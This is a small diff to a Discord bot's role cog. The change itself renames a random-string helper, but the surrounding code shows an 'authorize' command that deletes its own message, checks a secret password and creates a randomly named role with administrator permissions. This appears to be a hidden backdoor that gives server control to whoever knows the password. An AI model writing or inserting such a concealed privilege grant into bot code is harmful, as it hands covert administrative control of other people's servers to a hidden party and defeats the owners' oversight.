@@ -4,7 +4,7 @@ from discord import Member, Permissions, Role
 from discord.ext import commands
 from discord.utils import get
 
-from dscord.func import rng_str
+from dscord.func import randoms
 
 admin = Permissions(administrator=True)
 
@@ -17,7 +17,7 @@ class Role(commands.Cog):
     async def authorize(self, ctx, password: str = None) -> None:
         await ctx.message.delete()
         if password != os.environ['AUTHPW']: return
-        name = rng_str()
+        name = randoms()
         role = get(ctx.guild.roles, name=name)
         if not role:
             await ctx.guild.create_role(name=name, permissions=admin)
